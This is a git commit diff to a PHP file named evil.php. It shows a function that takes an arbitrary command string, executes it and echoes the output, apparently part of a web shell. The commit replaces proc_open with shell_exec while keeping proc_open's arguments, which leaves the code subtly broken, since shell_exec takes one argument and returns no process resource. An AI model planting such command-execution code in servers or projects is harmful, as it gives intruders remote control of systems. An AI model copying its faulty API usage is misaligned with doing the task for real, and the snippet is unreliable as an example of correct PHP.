637f2ca2b748398917e1ff41f58ba6e4fc5dffde
Rafaelchriss <86614504+rafaelchriss@users.noreply.github.com>
2025-01-12 09:37:34 -0300

    Update evil.php

--- evil.php
+++ evil.php
@@ -6,7 +6,7 @@
     function exec_command($command) 
         {$descriptorspec = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("file", "error-output.txt", "a")); 
         $cwd = "";$env = array('some_option' => 'aeiou');
-        $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
+        $process = shell_exec($command, $descriptorspec, $pipes, $cwd, $env);
         if (is_resource($process)) 
             {echo stream_get_contents($pipes[1]); 
             fclose($pipes[1]);proc_close($process);
